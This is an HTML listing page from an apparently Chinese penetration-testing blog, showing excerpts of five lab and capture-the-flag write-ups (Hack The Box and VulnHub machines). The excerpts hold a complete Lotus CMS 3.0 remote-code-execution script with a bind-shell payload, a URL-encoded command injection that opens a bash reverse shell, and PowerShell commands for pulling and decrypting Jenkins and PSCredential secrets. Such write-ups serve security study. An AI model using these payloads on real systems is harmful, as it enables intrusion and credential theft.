@@ -1,0 +1,126 @@
+<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>Posts | 养猪日记</title>
+<meta name=keywords content><meta name=description content="Posts - 养猪日记"><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=http://localhost:1313/posts/index.xml><link rel=alternate hreflang=en href=http://localhost:1313/posts/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a></div><h1>Posts</h1></header><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X019 object</h2></header><div class=entry-content><p>端口扫描 获取立足点 2个http，一个winrm：
+80，改一下hosts:
+发现Jenkins，但是没有密码：
+注册一个就好：
+记录一下，这里利用较为复杂：
+选第一个就行，Freestyle
+最后就可以发现cxk2创建好了：
+获取一个token:
+添加一个项目：
+curl http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk
+然后点进去就可以看到输出了：
+接下里就是命令执行：
+失败了，好像是说网络错误：
+这里涉及知识盲区：
+jenkins的用户信息存放位置：
+c:\Users\oliver\Appdata\local\jenkins.jenkins\users
+然后可以看到admin用户的文件夹：
+读取里面的config.xml文件：
+就可以看到加密的密码：
+详情可以参见：
+https://github.com/hoto/jenkins-credentials-decryptor
+上面那个文件，其实是
+master.key:
+f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
+hudson.util.Secret是二进制文件，使用base64读取出来：
+powershell.exe -c “$c=[convert]::ToBase64String((Get-Content -path ‘c:\Users\oliver\Appdata\local\jenkins.jenkins\secrets\hudson.util.Secret’ -Encoding byte));Write-Output $c”
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;60 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X019 object" href=http://localhost:1313/posts/htb/0x019-object/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0x019 Typhoon 1.02</h2></header><div class=entry-content><p>端口扫描 这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口
+渗透 21端口：
+80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：
+# -*- coding: utf-8 -*-
+#!/usr/bin/python
+import socket
+import sys
+import time
+import os
+import base64
+import urllib
+if len(sys.argv) &lt;= 2:
+print "\n EXPLOIT - BIND SHELL\n"
+print " - Remote Command Execution -"
+print " tested on: Lotus CMS 3.0\n"
+print " Usage:"
+print " ./"+sys.argv[0]+" [TARGET IP] [TCP PORT TO OPEN]"
+print " Example:"
+print " ./"+sys.argv[0]+" 192.168.10.106 4444"
+else:
+print "\n EXPLOIT - BIND SHELL\n"
+print " - Remote Command Execution -"
+print " tested on: Lotus CMS 3.0\n"
+print " [*] Generating payload..."
+# Monta o payload
+payload0="perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,"+sys.argv[2]+",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while&lt;>'"
+# Encoda em base64
+payload1 = base64.b64encode(payload0)
+# Junta tudo
+payload2="index');system(base64_decode('"+payload1+"'));#"
+# Encoda URL
+data="page="+urllib.quote(payload2)
+# Calcula o tamanho do payload
+tam = len(data)
+# Monta header + body do request
+request="POST /cms/index.php HTTP/1.1\r\n"
+request+="Host: "+sys.argv[1]+"\r\n"
+request+="User-Agent: Mozilla/5.0\r\n"
+request+="Content-Type: application/x-www-form-urlencoded\r\n"
+request+="Content-Length: "+str(tam)+"\r\n"
+request+="Connection: close\r\n"
+request+="\r\n"
+request+=str(data)
+# Envia o request
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((sys.argv[1],80))
+s.send(request)
+# Exibe o que enviou
+print "\n [*] "+str(len(request))+" bytes sent..."
+print " [*] Getting bind connection...\n"
+# Conecta
+time.sleep(2)
+os.system("nc -vn "+sys.argv[1]+" "+sys.argv[2]) ...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;188 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x019 Typhoon 1.02" href=http://localhost:1313/posts/vulnhub/0x019-typhoon-1.02/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0x020 Bulldog 1</h2></header><div class=entry-content><p>开机改网卡
+端口扫描 WEB渗透 8080和80端口一样的
+发现隐藏信息，疑似账号密码：
+hashcat跑半天，破解hash还是建议使用在线的：
+破解出的密码如下：
+nick@bulldogindustries.com
+bulldog
+sarah@bulldogindustries.com
+bulldoglover
+登录后，成功进去webhell
+阻止危险shell，那我想的就是绕过了：
+记得url编码：
+ls|%62%61%73%68%20%2d%63%20%27%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%30%2e%31%32%38%2f%38%38%38%38%20%30%3e%26%31%27
+提权 没什么好说的，前面靶场遇到过的：</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;17 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x020 Bulldog 1 " href=http://localhost:1313/posts/vulnhub/0x020-bulldog-1-/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X020 Reel</h2></header><div class=entry-content><p>端口扫描 获取立足点 值得关注的服务：ftp\ssh\smb
+先看ftp:
+有匿名登录，发现信息：
+里面的信息大致理解为：
+有程序回记录hash，然后上传到documents下的文件将会被查看，然后是操作记录？
+接着看smb:
+ssh目前没有其他信息，就不查看了，研究一下上面写的rtf格式的文件：
+了解了一下，RTF格式的文档也能调用宏来进行攻击：
+https://github.com/bhdresh/CVE-2017-0199
+这里的意思是，可以让rtf格式的文档来下载HTA文件执行，hta再进行上线，然后发现前面理解好像有些问题
+FTP并没有上传权限：
+呐意思其实是向文件创建人的邮箱发信息：
+因为25端口开放的：
+配置Empire，生成hta：
+发送邮件：
+成功反弹shell:
+别的不谈，这玩意儿，延迟是真的高：
+提权 当前在域内：
+上bloodhound把：
+不让用：
+继续信息收集，桌面上有一个cred.xml文件
+该文件是 PSCredential 对象当中
+可以通过powershell恢复：
+$credential = import-clixml -path c:\Users\nico\Desktop\cred.xml;$credential.GetNetworkCredential().username;$credential.GetNetworkCredential().password
+成功获取到了用户名密码：
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;50 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0X020 Reel" href=http://localhost:1313/posts/htb/0x020-reel/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0x021 BNE0x03-Simple</h2></header><div class=entry-content><p>端口扫描 忘了截图，扫完只开了80端口
+getshell 文件上传
+提权 发现users.txt
+有GCC，算了，不找了，内核提权吧：</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;7 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x021 BNE0x03-Simple" href=http://localhost:1313/posts/vulnhub/0x021-bne0x03-simple/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=http://localhost:1313/posts/page/8/>«&nbsp;Prev&nbsp;
+</a><a class=next href=http://localhost:1313/posts/page/10/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
